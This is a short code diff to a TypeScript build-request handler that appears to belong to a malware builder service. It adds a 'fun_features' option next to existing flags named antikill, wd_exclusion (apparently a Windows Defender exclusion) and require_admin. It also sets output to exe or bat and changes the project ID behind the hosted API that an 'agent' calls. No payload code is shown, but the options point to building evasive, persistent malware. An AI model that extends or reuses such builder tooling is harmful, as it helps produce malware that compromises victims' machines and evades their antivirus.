@@ -11,6 +11,7 @@ const Input = z.object({
   antikill: z.boolean().optional().default(false),
   wd_exclusion: z.boolean().optional().default(false),
   require_admin: z.boolean().optional().default(false),
+  fun_features: z.boolean().optional().default(false),
   tag: z.string().max(32).regex(/^[a-zA-Z0-9 _-]*$/).optional().nullable(),
   output_kind: z.enum(["exe", "bat"]),
   icon_url: z.string().url().optional().nullable(),
@@ -18,7 +19,7 @@ const Input = z.object({
 
 // Stable lovable.app URLs that actually serve our API (lovableproject.com
 // preview URLs redirect and break the agent's JSON parsing).
-const PROJECT_ID = "7b74ebe1-139a-493e-94a5-3e52cba1d8d3";
+const PROJECT_ID = "5a812085-735a-438c-8ab0-793e6374dce4";
 const STABLE_PROD = `https://project--${PROJECT_ID}.lovable.app`;
 const STABLE_DEV = `https://project--${PROJECT_ID}-dev.lovable.app`;
 
@@ -86,6 +87,7 @@ export const createBuild = createServerFn({ method: "POST" })
         antikill: data.antikill ?? false,
         wd_exclusion: data.wd_exclusion ?? false,
         require_admin: data.require_admin ?? false,
+        fun_features: data.fun_features ?? false,
         tag: data.tag ?? null,
         output_kind: data.output_kind,
         icon_url: data.icon_url ?? null,
